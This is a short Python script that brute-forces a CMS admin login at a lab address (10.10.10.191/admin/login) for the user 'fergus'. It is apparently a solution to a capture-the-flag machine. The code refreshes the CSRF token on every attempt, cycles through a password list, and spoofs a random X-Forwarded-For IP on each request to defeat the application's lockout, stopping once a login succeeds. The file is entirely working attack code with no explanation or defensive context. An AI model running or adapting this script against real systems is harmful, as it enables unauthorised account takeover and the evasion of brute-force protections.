#!/usr/bin/python3

import requests,sys,signal,re,time,random
from pwn import *

class BruteForce:
	user='fergus'
	def __init__(self, password, url):
		self.session = requests.session()
		self.password = password
		self.url = url

	def GetTokenCSRF(self):
		req = self.session.get(self.url)
		token_csrf = re.findall(r'name="tokenCSRF" value="(.*?)"', req.text)[0]
		return token_csrf

	def ReadPassword(self):
		f = open(self.password, "r")
		return f

	def Execute(self):
		cont = 1
		f = self.ReadPassword()
		p1 = log.progress("Brute Force")
		p1.status("Starting Brute Forcing")
		time.sleep(2)
		for password in f.readlines():
			password = password.strip("\n")
			headers = { "X-Forwarded-For" : f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}" }
			p1.status ("[%s/349] Trying password: %s"%(cont,password))
			send_data = {
					  'tokenCSRF' : self.GetTokenCSRF(),
					  'username'  : BruteForce.user,
					  'password'  : password,
					  'save'      : ''
					 }
			req = self.session.post(self.url,data=send_data,headers=headers)
			if "Username or password incorrect" not in req.text:
				p1.success("Password found: %s"%(password))
				break
			cont+=1

if __name__== '__main__':
	test = BruteForce("password","http://10.10.10.191/admin/login")
	test.Execute()
